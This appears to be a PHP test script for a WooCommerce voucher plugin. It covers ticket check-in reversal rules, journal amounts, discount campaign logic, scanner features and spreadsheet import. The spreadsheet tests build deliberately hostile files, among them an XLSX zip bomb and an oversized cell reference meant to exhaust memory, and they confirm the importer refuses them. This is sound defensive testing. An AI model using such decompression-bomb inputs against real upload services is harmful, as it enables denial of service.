$ev = static fn( int $id, string $event, ?float $balance = null, int $order = 0, int $user = 0, string $at = '2026-01-01 10:00:00', float $amount = 10.0 ) => array( 'id' => $id, 'voucher_id' => 7, 'event' => $event, 'amount' => $amount, 'balance_after' => $balance, 'order_id' => $order, 'user_id' => $user, 'note' => '', 'created_at' => $at );
$hist = array( $ev( 1, 'issued', 50.0 ), $ev( 2, 'reserved', 0.0, 99 ), $ev( 3, 'resent' ) );
check( 'a balance held by an unpaid order is recognised (not "already redeemed")', 2 === ( Tickets::open_reservation( $hist )['id'] ?? 0 ) );
check( 'once committed or released the reservation is no longer open', null === Tickets::open_reservation( array_merge( $hist, array( $ev( 4, 'committed', 0.0, 99 ) ) ) ) && null === Tickets::open_reservation( array_merge( $hist, array( $ev( 4, 'reservation_released', 50.0, 99 ) ) ) ) );
check( 'last_event finds the newest event of a kind', 2 === Tickets::last_event( $hist, array( 'reserved', 'issued' ) )['id'] && null === Tickets::last_event( $hist, array( 'voided' ) ) );

$ticket               = new Voucher();
$ticket->id           = 7;
$ticket->type         = 'ticket';
$ticket->status       = Voucher::STATUS_ACTIVE;
$ticket->max_checkins = 2;
$ticket->checkins     = 1;
$now                  = strtotime( '2026-01-01 10:05:00 UTC' );
$mine                 = $ev( 5, 'checkin', null, 0, 3, '2026-01-01 10:00:00' );
check( 'own check-in can be reverted within the time window', 'own' === Tickets::undo_mode( $ticket, $mine, 3, false, $now ) );
check( 'after the window, or someone else\'s check-in: only managers, with a reason', '' === Tickets::undo_mode( $ticket, $mine, 3, false, $now + 3600 ) && '' === Tickets::undo_mode( $ticket, $mine, 4, false, $now ) && 'reason' === Tickets::undo_mode( $ticket, $mine, 4, true, $now ) );
$void_ticket         = clone $ticket;
$void_ticket->status = Voucher::STATUS_VOID;
$old_ticket          = clone $ticket;
$old_ticket->expires_at = '2020-01-01 00:00:00';
check( 'cancelled or expired tickets cannot be reverted at all (no extra admissions)', '' === Tickets::undo_mode( $void_ticket, $mine, 3, true, $now ) && '' === Tickets::undo_mode( $old_ticket, $mine, 3, true, $now ) );
$m15_ticket           = clone $ticket;
$m15_ticket->max_checkins = 3;
$m15_ticket->checkins = 2;
$m15_hist             = array( $ev( 1, 'checkin', null, 0, 4, '2026-01-01 09:00:00', 2.0 ), $ev( 2, 'checkin', null, 0, 3, '2026-01-01 10:00:00', 1.0 ), $ev( 3, 'checkin_undo', null, 0, 3, '2026-01-01 10:01:00', 1.0 ) );
check( 'M12-15: own undo reverts at most the admissions of that check-in (checked in 1, undone 1 → no further own undo)', 1 === Tickets::undone_since_checkin( $m15_hist ) && 0 === Tickets::undone_since_checkin( array_slice( $m15_hist, 0, 2 ) ) && 'own' === Tickets::undo_mode( $m15_ticket, $m15_hist[1], 3, false, $now, 0 ) && '' === Tickets::undo_mode( $m15_ticket, $m15_hist[1], 3, false, $now, 1 ) && 'reason' === Tickets::undo_mode( $m15_ticket, $m15_hist[1], 3, true, $now, 1 ) );
check( 'M12-15: a check-in of 2 admissions can be undone twice by its cashier', 'own' === Tickets::undo_mode( $m15_ticket, $m15_hist[0], 4, false, strtotime( '2026-01-01 09:05:00 UTC' ), 1 ) && '' === Tickets::undo_mode( $m15_ticket, $m15_hist[0], 4, false, strtotime( '2026-01-01 09:05:00 UTC' ), 2 ) );
check( 'M12-44: ledger source by whole route segments – the redemption API is not the scanner', 'scanner' === VCAP\Source::for_route( '/vcap/v1/redeem' ) && 'scanner' === VCAP\Source::for_route( '/vcap/v1/redeem/reverse' ) && 'scanner' === VCAP\Source::for_route( 'vcap/v1/lookup' ) && 'rest' === VCAP\Source::for_route( '/vcap/v1/redemptions' ) && 'rest' === VCAP\Source::for_route( '/vcap/v1/redemptions/abc12345/commit' ) && 'rest' === VCAP\Source::for_route( '/vcap/v1/lookups' ) && 'checkout' === VCAP\Source::for_route( '/wc/store/v1/checkout' ) && 'rest' === VCAP\Source::for_route( '/wc/storefront' ) );

$card             = new Voucher();
$card->id         = 7;
$card->usage_mode = 'balance';
$card->status     = Voucher::STATUS_ACTIVE;
$booking          = $ev( 8, 'redeemed', 20.0, 0, 3, '2026-01-01 10:00:00' );
check( 'the cashier can cancel their own counter redemption shortly after', '' === Tickets::reversal_refusal( $booking, $card, 3, false, $now, false ) );
check( 'later or by someone else only a manager may cancel it', 'forbidden' === Tickets::reversal_refusal( $booking, $card, 3, false, $now + 3600, false ) && 'forbidden' === Tickets::reversal_refusal( $booking, $card, 4, false, $now, false ) && '' === Tickets::reversal_refusal( $booking, $card, 4, true, $now + 3600, false ) );
check(
	'shop orders, cancelled vouchers, other events and double cancellations are refused',
	'order' === Tickets::reversal_refusal( $ev( 8, 'redeemed', 20.0, 55, 3 ), $card, 3, true, $now, false )
	&& 'reversed' === Tickets::reversal_refusal( $booking, $card, 3, true, $now, true )
	&& 'not_found' === Tickets::reversal_refusal( $ev( 8, 'adjusted', 20.0 ), $card, 3, true, $now, false )
	&& 'not_found' === Tickets::reversal_refusal( null, $card, 3, true, $now, false )
	&& 'void' === Tickets::reversal_refusal( $booking, ( static function ( $v ) { $v->status = Voucher::STATUS_VOID; return $v; } )( clone $card ), 3, true, $now, false )
);
$rev_codes = array( 'reason', 'order', 'reversed', 'void', 'forbidden', 'used', 'failed', 'other' );
check( 'every cancellation refusal has its own message', count( $rev_codes ) === count( array_unique( array_map( array( Tickets::class, 'reversal_message' ), $rev_codes ) ) ) );
check( 'cancelled counter redemptions count in the redemption journal and give a single-use voucher its value back', in_array( 'redeem_reversed', VCAP\Ledger::MONEY_EVENTS, true ) );
$f_root  = dirname( __DIR__ );
$f_admin = (string) file_get_contents( $f_root . '/assets/css/admin.css' );
check( 'F14: admin.css is loaded on the order screens (posts and HPOS) and the detail grid fits a phone', str_contains( $f_admin, 'minmax(min(380px, 100%), 1fr)' ) && in_array( 'shop_order', VCAP\Admin\Menu::ORDER_SCREENS, true ) && in_array( 'woocommerce_page_wc-orders', VCAP\Admin\Menu::ORDER_SCREENS, true ) );
$f_css   = $f_admin . (string) file_get_contents( $f_root . '/assets/css/frontend.css' ) . preg_replace( '/\.vcap-d-(handle|rotate|guide)[^}]*}/', '', (string) file_get_contents( $f_root . '/assets/css/designer.css' ) );
$f_mail  = (string) file_get_contents( $f_root . '/templates/emails/voucher.php' );
check( 'F15: no physical left/right in the stylesheets (logical properties; canvas handles excepted), RTL-aware email, no off-screen -9999px', ! preg_match( '/(margin|padding|border)-(left|right)\s*:|text-align:\s*(left|right)|float:\s*(left|right)/', $f_css ) && ! preg_match( '/(border|padding|margin)-left:/', $f_mail ) && str_contains( $f_mail, "is_rtl() ? 'right' : 'left'" ) && ! str_contains( (string) file_get_contents( $f_root . '/src/Shortcodes.php' ), '-9999px' ) );
check( 'F16: email without nested <p>, text contrast ≥ 4.5:1 (#666), bulletproof buttons; no inline onfocus; translated preview error; designer icons ≥ 24 px', ! str_contains( $f_mail, '<p><?php echo wp_kses_post( wpautop' ) && ! str_contains( $f_mail, '#777' ) && 2 === substr_count( $f_mail, 'bgcolor="<?php echo esc_attr( $vcap_c[\'base\'] ); ?>"' ) && ! str_contains( (string) file_get_contents( $f_root . '/src/Referrals.php' ), 'onfocus' ) && str_contains( (string) file_get_contents( $f_root . '/assets/js/campaigns.js' ), 'cfg.error' ) && str_contains( (string) file_get_contents( $f_root . '/assets/css/designer.css' ), 'min-width: 24px; min-height: 24px;' ) );
check( 'M11: field keys from labels without Latin letters become field_N (by position), like slug() in field-groups.js', 'field_3' === VCAP\Fields::field_key( '', 'Όνομα παραλήπτη', 3 ) && 'field_1' === VCAP\Fields::field_key( '', 'Име', 1 ) && 'grusskarte' === VCAP\Fields::field_key( '', 'Grußkarte', 2 ) && 'farbe_wahlen' === VCAP\Fields::field_key( '', 'Farbe wählen!', 1 ) && 'my_key' === VCAP\Fields::field_key( 'my_key', 'Όνομα', 4 ) && 'field_42' === VCAP\Fields::field_key( '42', '', 1 ) && '' === VCAP\Fields::field_key( ' ', '', 5 ) && str_contains( (string) file_get_contents( $f_root . '/assets/js/field-groups.js' ), "'field_' + ( index + 1 )" ) );
check( 'M10/H11: delivery dates show in the voucher date format, the help text names the delivery time, the picker starts today', '24.12.2026' === VCAP\Fields::display_value( '2026-12-24' ) && 'Anna' === VCAP\Fields::display_value( 'Anna' ) && '08:00' === VCAP\Fields::delivery_time_text() && str_contains( VCAP\Fields::builtin_definitions( array( 'builtin_fields' => array( 'delivery_date' ) ) + ProductConfig::DEFAULTS )['delivery_date']['tooltip'], '08:00' ) && 'vcap_recipient_name' === VCAP\Fields::item_meta_key( 'recipient_name' ) );
check( 'U14: the reconciliation names states in words and amounts with currency (no raw "committed" or "12.50")', 'Confirmed' === VCAP\Compat\PassCaptainReconcile::state_label( 'committed' ) && 'Released' === VCAP\Compat\PassCaptainReconcile::state_label( 'released' ) && 'Reserved' === VCAP\Compat\PassCaptainReconcile::state_label( 'reserved' ) && ! str_contains( (string) file_get_contents( dirname( __DIR__ ) . '/src/Compat/PassCaptainReconcile.php' ), 'wc_format_decimal' ) && "12,50\u{a0}€" === VCAP\Tickets::money_text( 12.5, 'EUR' ) );
check( 'U12: send_to and the old buyer copy flag become one routing choice', 'both' === ProductConfig::normalise_routing( array( 'send_to' => 'recipient', 'buyer_copy' => 'yes' ) )['send_to'] && 'recipient' === ProductConfig::normalise_routing( array( 'send_to' => 'recipient', 'buyer_copy' => 'no' ) )['send_to'] && 'buyer' === ProductConfig::normalise_routing( array( 'send_to' => 'buyer', 'buyer_copy' => 'yes' ) )['send_to'] && 'both' === ProductConfig::normalise_routing( ProductConfig::DEFAULTS )['send_to'] );
check( 'T15: a booked-off rounding rest is a money event that takes value off the card (journal and liability stay reconciled)', in_array( VCAP\CouponManager::WRITTEN_OFF_EVENT, VCAP\Ledger::MONEY_EVENTS, true ) && -0.01 === VCAP\Ledger::signed_amount( VCAP\CouponManager::WRITTEN_OFF_EVENT, 0.01 ) && isset( VCAP\VoucherRepository::event_labels()[ VCAP\CouponManager::WRITTEN_OFF_EVENT ] ) );
check( 'U6: the journal amount is signed – redemptions negative, issue/refunds/credits positive, corrections with their own sign', -12.5 === VCAP\Ledger::signed_amount( 'redeemed', 12.5 ) && -3.0 === VCAP\Ledger::signed_amount( 'api_committed', '3' ) && -4.0 === VCAP\Ledger::signed_amount( 'debit', 4 ) && 20.0 === VCAP\Ledger::signed_amount( 'issued', 20 ) && 5.0 === VCAP\Ledger::signed_amount( 'restored', 5 ) && -7.0 === VCAP\Ledger::signed_amount( 'adjusted', -7 ) && 7.0 === VCAP\Ledger::signed_amount( 'adjusted', 7 ) && ! array_diff( VCAP\Ledger::OUT_EVENTS, VCAP\Ledger::MONEY_EVENTS ) );
check( 'counter note keeps receipt number and till', 'Redeemed in store · Receipt 4711 · Till Filiale 2' === Tickets::counter_note( '', ' 4711 ', 'Filiale 2' ) && 'Gift · Receipt 1' === Tickets::counter_note( 'Gift', '1' ) );
check( 'WooCommerce keeps sending users without the scanner right away from wp-admin', true === Tickets::allow_scanner_admin( true ) && false === Tickets::allow_scanner_admin( false ) );

$scanner_js  = (string) file_get_contents( dirname( __DIR__ ) . '/assets/js/scanner.js' );
$scanner_php = (string) file_get_contents( dirname( __DIR__ ) . '/src/Admin/Scanner.php' );
$ticket_tpl  = (string) file_get_contents( dirname( __DIR__ ) . '/templates/ticket-status.php' );
check( 'scanner: codes are posted, never put into the lookup URL', ! str_contains( $scanner_js, 'lookup?q=' ) && str_contains( $scanner_js, "api( 'lookup', 'POST'" ) );
check( 'scanner: requests time out and an unanswered booking is shown as unclear', str_contains( $scanner_js, 'AbortController' ) && str_contains( $scanner_js, 't.unclear' ) && str_contains( $scanner_php, "'unclear'" ) );
check( 'scanner: an expired nonce is renewed and the request repeated', str_contains( $scanner_js, 'renewNonce' ) && str_contains( $scanner_php, 'action=rest-nonce' ) );
check( 'scanner: no camera is a hint (HTTPS, permission), not a system error', str_contains( $scanner_js, 'function noCamera' ) && ! str_contains( $scanner_js, 'showError( { message: t.noCamera } )' ) );
check( 'scanner: no autofocus that opens the phone keyboard over the camera', ! str_contains( $scanner_php, 'autofocus' ) && str_contains( $scanner_js, 'pointer: coarse' ) );
check( 'M12-40: jsQR also reads inverted (light-on-dark) QR codes', str_contains( $scanner_js, "inversionAttempts: 'attemptBoth'" ) && ! str_contains( $scanner_js, 'dontInvert' ) );
check( 'M12-79: a replayed answer is marked, pending keys survive a reload (sessionStorage) and are dropped after any answer but "in progress"', str_contains( $scanner_js, 'd.replayed' ) && str_contains( $scanner_js, 't.replayed' ) && str_contains( $scanner_php, "'replayed'" ) && str_contains( $scanner_js, 'window.sessionStorage.setItem( KEY_STORE' ) && str_contains( $scanner_js, "'vcap_in_progress' !== err.code" ) );
check( 'M12-80: camera stops on visibilitychange and ended tracks, torch button, ideal 1280 px, play() rejection handled', str_contains( $scanner_js, "'visibilitychange'" ) && str_contains( $scanner_js, "addEventListener( 'ended'" ) && str_contains( $scanner_js, 'torch: ! torchOn' ) && str_contains( $scanner_php, 'id="vcap-torch"' ) && str_contains( $scanner_js, 'width: { ideal: 1280 }' ) && str_contains( $scanner_js, 'playing.catch' ) );
check( 'M12-24/M12-31/M12-45: scanner shows the personal banner with ID checkbox, the VAT text, the receipt rule, own reversible bookings and prints the 80 mm slip', str_contains( $scanner_js, 'vcap-r-personal' ) && str_contains( $scanner_js, 'body.id_checked' ) && str_contains( $scanner_js, 'd.treatment_label' ) && str_contains( $scanner_js, 'current.receipt_required' ) && str_contains( $scanner_js, 'd.reversible' ) && str_contains( $scanner_js, 'printSlip( current && current.slip )' ) && str_contains( $scanner_php, 'id="vcap-slip"' ) && str_contains( (string) file_get_contents( dirname( __DIR__ ) . '/assets/css/admin.css' ), 'width: 72mm' ) );
check( 'M12-81: managed tills as a dropdown, fixed per staff member; offline mode documented as intentionally absent', str_contains( $scanner_php, "'fixedTill'" ) && str_contains( $scanner_php, '<select id="vcap-till"' ) && str_contains( $scanner_js, 'cfg.fixedTill' ) && str_contains( (string) file_get_contents( dirname( __DIR__ ) . '/src/Settings.php' ), 'Counter::LOCATIONS' ) && str_contains( $scanner_php, 'vcap-online-only' ) );
check( 'ticket page: check-in form carries a one-time key, refusals are red', str_contains( $ticket_tpl, 'vcap_checkin_key' ) && str_contains( $ticket_tpl, 'notice--error' ) );
// AP-W1-2 / AP-Q2-7: every overridable template names its version, so outdated theme copies can be reported.
$w12_versions = array();
foreach ( new RecursiveIteratorIterator( new RecursiveDirectoryIterator( dirname( __DIR__ ) . '/templates', FilesystemIterator::SKIP_DOTS ) ) as $w12_file ) {
	if ( 'php' === $w12_file->getExtension() ) {
		$w12_versions[ substr( $w12_file->getPathname(), strlen( dirname( __DIR__ ) . '/templates/' ) ) ] = VCAP\Plugin::template_version( $w12_file->getPathname() );
	}
}
check( 'AP-W1-2: every overridable template carries "@version 1.2.0"', count( $w12_versions ) >= 6 && array( '1.2.0' ) === array_values( array_unique( $w12_versions ) ), json_encode( $w12_versions ) );
$w13_src = array_map( static fn( $f ) => (string) file_get_contents( dirname( __DIR__ ) . '/src/Admin/' . $f ), array( 'sc' => 'StoreCreditAdmin.php', 'jp' => 'JobProgress.php', 'im' => 'Import.php' ) );
check( 'AP-W1-3: no inline <script> or onsubmit in the store credit refund, job progress and code import screens', ! preg_grep( '/(echo\s+["\']<script|^\s*<script|onsubmit=)/m', $w13_src ) && str_contains( $w13_src['sc'], "wp_add_inline_script(\n\t\t\t'vcap-admin'" ) && str_contains( $w13_src['jp'], "wp_add_inline_script( 'vcap-admin'" ) && str_contains( $w13_src['im'], 'data-confirm="' ) );
check( 'AP-W1-2: the plugin templates are added to woocommerce_template_overrides_scan_paths', array( 'WooCommerce' => '/wc/', 'Voucher Captain' => VCAP_PATH . 'templates/' ) === VCAP\Plugin::template_scan_paths( array( 'WooCommerce' => '/wc/' ) ) );

echo "Discount campaign engine\n";
use VCAP\Discounts\Engine;
$lines = array(
	array( 'key' => 'shirt', 'product_id' => 11, 'categories' => array( 5 ), 'unit' => 20.0, 'qty' => 3, 'is_voucher' => false ),
	array( 'key' => 'cap', 'product_id' => 12, 'categories' => array( 6 ), 'unit' => 10.0, 'qty' => 1, 'is_voucher' => false ),
	array( 'key' => 'gift', 'product_id' => 13, 'categories' => array(), 'unit' => 50.0, 'qty' => 1, 'is_voucher' => true ),
);
$ctx = array( 'now' => 1800000000, 'logged_in' => true, 'roles' => array( 'customer' ), 'has_previous_order' => false, 'other_coupons' => array(), 'allow_vouchers' => false, 'decimals' => 2 );
$r   = static fn( array $x ) => Engine::normalize( $x );
check( 'percent: 10 % on all non-voucher lines', array( 'shirt' => 6.0, 'cap' => 1.0 ) === Engine::discounts( $r( array( 'action' => 'percent', 'percent' => 10 ) ), $lines, $ctx ) );
check( 'vouchers are never discounted unless allowed', ! isset( Engine::discounts( $r( array( 'action' => 'percent', 'percent' => 10 ) ), $lines, $ctx )['gift'] ) );
check( 'category restriction', array( 'cap' => 1.0 ) === Engine::discounts( $r( array( 'action' => 'percent', 'percent' => 10, 'categories' => array( 6 ) ) ), $lines, $ctx ) );
check( 'excluded product', array( 'cap' => 1.0 ) === Engine::discounts( $r( array( 'action' => 'percent', 'percent' => 10, 'exclude_products' => array( 11 ) ) ), $lines, $ctx ) );
$fixed = Engine::discounts( $r( array( 'action' => 'fixed', 'amount' => 7 ) ), $lines, $ctx );
check( 'fixed amount is split proportionally and sums exactly', abs( array_sum( $fixed ) - 7.0 ) < 0.00001 && 6.0 === $fixed['shirt'] && 1.0 === $fixed['cap'], json_encode( $fixed ) );
check( 'fixed amount never exceeds the eligible total', abs( array_sum( Engine::discounts( $r( array( 'action' => 'fixed', 'amount' => 500 ) ), $lines, $ctx ) ) - 70.0 ) < 0.00001 );
$tiers = array( 'action' => 'tiered', 'tiers' => array( array( 'min_qty' => 2, 'percent' => 5 ), array( 'min_qty' => 4, 'percent' => 15 ) ) );
check( 'tiered: 4 items reach the 15 % tier', array( 'shirt' => 9.0, 'cap' => 1.5 ) === Engine::discounts( $r( $tiers ), $lines, $ctx ) );
check( 'tiered: 3 shirts only reach 5 %', array( 'shirt' => 3.0 ) === Engine::discounts( $r( $tiers + array( 'categories' => array( 5 ) ) ), $lines, $ctx ) );
check( 'tiered: below the first tier nothing applies', array() === Engine::discounts( $r( $tiers + array( 'products' => array( 12 ) ) ), $lines, $ctx ) );
check( 'buy 2 get 1 free: the cheapest unit is free', array( 'cap' => 10.0 ) === Engine::discounts( $r( array( 'action' => 'bxgy', 'buy_qty' => 2, 'get_qty' => 1, 'get_percent' => 100 ) ), $lines, $ctx ) );
$bogo = Engine::discounts( $r( array( 'action' => 'bxgy', 'buy_qty' => 1, 'get_qty' => 1, 'get_percent' => 50, 'repeat' => true ) ), $lines, $ctx );
ksort( $bogo );
check( 'buy 1 get 1 50 % repeated: two cheapest units at half price', array( 'cap' => 5.0, 'shirt' => 10.0 ) === $bogo, json_encode( $bogo ) );
check( 'buy 1 get 1 without repeat: only one unit', array( 'cap' => 5.0 ) === Engine::discounts( $r( array( 'action' => 'bxgy', 'buy_qty' => 1, 'get_qty' => 1, 'get_percent' => 50 ) ), $lines, $ctx ) );
check( 'buy X get Y needs enough items', 'min_qty' === Engine::blocker( $r( array( 'action' => 'bxgy', 'buy_qty' => 3, 'get_qty' => 1, 'products' => array( 11 ) ) ), $lines, $ctx ) );
check( 'minimum cart value ignores voucher lines (buying a gift card unlocks nothing)', '' === Engine::blocker( $r( array( 'min_subtotal' => 70 ) ), $lines, $ctx ) && 'min_subtotal' === Engine::blocker( $r( array( 'min_subtotal' => 71 ) ), $lines, $ctx ) );
check( 'voucher lines count when discounts on vouchers are allowed', '' === Engine::blocker( $r( array( 'min_subtotal' => 120 ) ), $lines, array( 'allow_vouchers' => true ) + $ctx ) );
$stacked = Engine::stack( array( 1 => $r( array( 'action' => 'bxgy', 'buy_qty' => 2, 'get_qty' => 1, 'get_percent' => 100, 'categories' => array( 5 ) ) ), 2 => $r( array( 'action' => 'percent', 'percent' => 50 ) ) ), $lines, $ctx );
check( 'stacked promotions never exceed the line price', 20.0 === $stacked[1]['shirt'] && 30.0 === $stacked[2]['shirt'] && 60.0 >= $stacked[1]['shirt'] + $stacked[2]['shirt'] && 5.0 === $stacked[2]['cap'], json_encode( $stacked ) );
$alone = Engine::stack( array( 1 => $r( array( 'action' => 'percent', 'percent' => 80 ) ), 2 => $r( array( 'action' => 'percent', 'percent' => 50 ) ) ), $lines, $ctx );
check( 'the second promotion only gets what the first one left', 48.0 === $alone[1]['shirt'] && 12.0 === $alone[2]['shirt'], json_encode( $alone ) );
check( 'promotions do not share the cart with individual-use coupons', 'other_coupon' === Engine::blocker( $r( array() ), $lines, array( 'individual_use_coupon' => true ) + $ctx ) );
check( 'date window', 'not_started' === Engine::blocker( $r( array( 'date_from' => 1800000001 ) ), $lines, $ctx ) && 'ended' === Engine::blocker( $r( array( 'date_to' => 1799999999 ) ), $lines, $ctx ) );
check( 'customer groups', 'customer' === Engine::blocker( $r( array( 'customer' => 'roles', 'roles' => array( 'wholesale' ) ) ), $lines, $ctx ) && '' === Engine::blocker( $r( array( 'customer' => 'first_order' ) ), $lines, $ctx ) && 'customer' === Engine::blocker( $r( array( 'customer' => 'returning' ) ), $lines, $ctx ) );
check( 'can refuse to combine with other coupons', 'other_coupon' === Engine::blocker( $r( array( 'with_coupons' => false ) ), $lines, array( 'other_coupons' => array( 'summer' ) ) + $ctx ) );
check( 'bonus promotions never discount the cart', array() === Engine::discounts( $r( array( 'action' => 'bonus', 'bonus_amount' => 10 ) ), $lines, $ctx ) );
check( 'bonus after a qualifying order', '' === Engine::bonus_blocker( $r( array( 'action' => 'bonus', 'bonus_amount' => 10, 'min_subtotal' => 70 ) ), $lines, $ctx ) );
check( 'bonus for gift card purchases counts only vouchers', '' === Engine::bonus_blocker( $r( array( 'action' => 'bonus', 'bonus_amount' => 5, 'bonus_trigger' => 'gift_card', 'min_subtotal' => 50 ) ), $lines, $ctx ) && 'min_subtotal' === Engine::bonus_blocker( $r( array( 'action' => 'bonus', 'bonus_amount' => 5, 'bonus_trigger' => 'gift_card', 'min_subtotal' => 51 ) ), $lines, $ctx ) );
check( 'bonus needs a value', 'no_items' === Engine::bonus_blocker( $r( array( 'action' => 'bonus' ) ), $lines, $ctx ) );
$campaigns = array(
	array( 'id' => 1, 'priority' => 20, 'rules' => $r( array( 'percent' => 5, 'stackable' => true ) ) ),
	array( 'id' => 2, 'priority' => 10, 'rules' => $r( array( 'percent' => 20 ) ) ),
	array( 'id' => 3, 'priority' => 30, 'rules' => $r( array( 'percent' => 5, 'stackable' => true ) ) ),
);
check( 'priority: an exclusive campaign with the best priority applies alone', array( 2 ) === Engine::select( $campaigns, $lines, $ctx ) );
$campaigns[1]['priority'] = 25;
check( 'stackable campaigns combine, a later exclusive one is skipped', array( 1, 3 ) === Engine::select( $campaigns, $lines, $ctx ) );

echo "Spreadsheet import\n";
$csv = "$out/codes.csv";
file_put_contents( $csv, "\xEF\xBB\xBFcode;note\nAAA-111;x\nBBB-222;y\n\n\"CCC;333\";z\n" );
$rows = SpreadsheetReader::read( $csv, 'csv' );
check( 'CSV with BOM + semicolon delimiter', array( 'code', 'AAA-111', 'BBB-222', 'CCC;333' ) === array_column( $rows, 0 ), json_encode( $rows ) );

if ( class_exists( 'ZipArchive' ) ) {
	// Zip bomb: a tiny archive whose worksheet unpacks to far more than the limit is refused before reading.
	$bomb = "$out/bomb.xlsx";
	$zip  = new ZipArchive();
	$zip->open( $bomb, ZipArchive::CREATE | ZipArchive::OVERWRITE );
	$zip->addFromString( 'xl/worksheets/sheet1.xml', '<worksheet><sheetData>' . str_repeat( ' ', 80 * 1024 * 1024 ) . '</sheetData></worksheet>' );
	$zip->close();
	$refused = '';
	try {
		SpreadsheetReader::read( $bomb, 'xlsx' );
	} catch ( RuntimeException $e ) {
		$refused = $e->getMessage();
	}
	check( 'XLSX zip bomb is refused before it is unpacked', str_contains( $refused, 'too large' ), $refused );
	$ok_file = "$out/small.xlsx";
	$zip     = new ZipArchive();
	$zip->open( $ok_file, ZipArchive::CREATE | ZipArchive::OVERWRITE );
	$zip->addFromString( 'xl/worksheets/sheet1.xml', '<worksheet><sheetData><row><c t="inlineStr"><is><t>CODE-1</t></is></c></row></sheetData></worksheet>' );
	$zip->close();
	check( 'a normal XLSX is still read', array( array( 'CODE-1' ) ) === SpreadsheetReader::read( $ok_file, 'xlsx' ) );
	unlink( $bomb );

	$far  = "$out/far.xlsx";
	$zip  = new ZipArchive();
	$zip->open( $far, ZipArchive::CREATE | ZipArchive::OVERWRITE );
	$zip->addFromString( 'xl/worksheets/sheet1.xml', '<worksheet><sheetData><row><c r="A1" t="inlineStr"><is><t>CODE-1</t></is></c><c r="ZZZZZZ1" t="inlineStr"><is><t>x</t></is></c></row></sheetData></worksheet>' );
	$zip->close();
	$refused = '';
	$peak    = memory_get_usage();
	try {
		SpreadsheetReader::read( $far, 'xlsx' );
	} catch ( RuntimeException $e ) {
		$refused = $e->getMessage();
	}
	check( 'Q9: a cell "ZZZZZZ1" is refused with a message instead of padding the row until memory runs out', str_contains( $refused, 'beyond the last column' ) && memory_get_usage() - $peak < 5 * 1024 * 1024, $refused );
	$gap = "$out/gap.xlsx";
	$zip = new ZipArchive();
	$zip->open( $gap, ZipArchive::CREATE | ZipArchive::OVERWRITE );
	$zip->addFromString( 'xl/worksheets/sheet1.xml', '<worksheet><sheetData><row><c r="A1" t="inlineStr"><is><t>CODE-1</t></is></c><c r="XFD1" t="inlineStr"><is><t>last</t></is></c></row></sheetData></worksheet>' );
	$zip->close();
	$gap_rows = SpreadsheetReader::read( $gap, 'xlsx' );
	check( 'Q9: gaps are not filled (column XFD is read without 16382 empty cells)', 2 === count( $gap_rows[0] ) && 'last' === $gap_rows[0][16383] && 'CODE-1' === $gap_rows[0][0], json_encode( array_keys( $gap_rows[0] ) ) );
	unlink( $far );
	unlink( $gap );
}

$ole = "$out/broken.xls";
file_put_contents( $ole, "\xD0\xCF\x11\xE0\xA1\xB1\x1A\xE1" . str_repeat( "\0", 22 ) . pack( 'v', 30 ) . str_repeat( "\xFF", 600 ) );
$refused = '';
try {
	SpreadsheetReader::read( $ole, 'xls' );
} catch ( RuntimeException $e ) {
	$refused = $e->getMessage();
}
check( 'Q9: an XLS with an impossible sector size is refused as damaged', str_contains( $refused, 'damaged' ), $refused );
unlink( $ole );

$utf16 = "$out/unicode.txt";
file_put_contents( $utf16, "\xFF\xFE" . mb_convert_encoding( "code\tnote\r\nÄBC-123\tx\r\nDEF-456\ty\r\n", 'UTF-16LE', 'UTF-8' ) );
$u_rows = SpreadsheetReader::read( $utf16, 'txt' );
check( 'Q10: Excel "Unicode text" (UTF-16LE with BOM) is read without NUL bytes', array( 'code', 'ÄBC-123', 'DEF-456' ) === array_column( $u_rows, 0 ), json_encode( $u_rows ) );
file_put_contents( $utf16, "\xFE\xFF" . mb_convert_encoding( "code\nGHI-789\n", 'UTF-16BE', 'UTF-8' ) );
check( 'Q10: UTF-16BE with BOM is read as well', array( 'code', 'GHI-789' ) === array_column( SpreadsheetReader::read( $utf16, 'txt' ), 0 ) );
file_put_contents( $utf16, mb_convert_encoding( "code\nJKL-012\n", 'UTF-16LE', 'UTF-8' ) );
check( 'Q10: UTF-16LE without BOM is recognised by its NUL bytes', array( 'code', 'JKL-012' ) === array_column( SpreadsheetReader::read( $utf16, 'txt' ), 0 ) );
file_put_contents( $utf16, "code\n\xC4BC-1\n" );
check( 'Windows-1252 files are still converted', 'ÄBC-1' === SpreadsheetReader::read( $utf16, 'txt' )[1][0] );
unlink( $utf16 );

$q10_masked = VCAP\Downloads::masked_code( 'gutschein-äöüé' );
check( 'Q10: the masked code keeps whole multibyte characters (no broken UTF-8)', '…ÄÖÜÉ' === $q10_masked && mb_check_encoding( $q10_masked, 'UTF-8' ) && '…X-ÄÖ' === VCAP\Downloads::masked_code( 'abx-äö' ), $q10_masked );
echo "Code import checks (Q2, Q10, H8)\n";
$fmt_any = "\x01^\\S{1,100}$\x01u";
check( 'Q2: WC stub formats like WooCommerce 11.3 ("B&B" → "b&amp;b")', 'b&amp;b-1' === wc_format_coupon_code( 'B&B-1' ) && 'abc' === wc_format_coupon_code( ' ABC ' ) );
check( 'Q2: an imported code WooCommerce would change ("B&B-…", "<b>…") is refused with the reason', str_contains( VCAP\Admin\Import::code_problem( 'B&B-12345678', $fmt_any ), 'b&amp;b' ) && '' !== VCAP\Admin\Import::code_problem( 'X<b>Y</b>', $fmt_any ) );
check( 'Q2: a code longer than 100 characters is refused before the insert', str_contains( VCAP\Admin\Import::code_problem( str_repeat( 'A', 101 ), "\x01^\\S{1,200}$\x01u" ), '100' ) && '' === VCAP\Admin\Import::code_problem( str_repeat( 'A', 100 ), $fmt_any ) );
check( 'Q10: codes with control characters (NUL from a misread file) are refused', '' !== VCAP\Admin\Import::code_problem( "A\0B\0C\0", $fmt_any ) && '' !== VCAP\Admin\Import::code_problem( "AB\x7FC", $fmt_any ) );
check( 'Q2: ordinary codes pass; the format is still checked', '' === VCAP\Admin\Import::code_problem( 'GIFT-K7QM2X9ZPA', $fmt_any ) && str_contains( VCAP\Admin\Import::code_problem( 'ab', "\x01^[A-Z]{4,}$\x01u" ), 'format' ) );
$col = VCAP\Admin\Import::resolve_column( array( array( 'Name', 'ID', 'Nr' ), array( 'x', 'K7QM2X9ZPA', '1' ) ), 'ID', false );
check( 'H8: a two-letter header ("ID") is found as a name first, not read as column letters', 1 === $col['index'] && true === $col['header'] && '' === $col['error'], json_encode( $col ) );
$col = VCAP\Admin\Import::resolve_column( array( array( 'Name', 'Code' ) ), 'B', true );
check( 'H8: a column letter still works', 1 === $col['index'] && '' === $col['error'] );
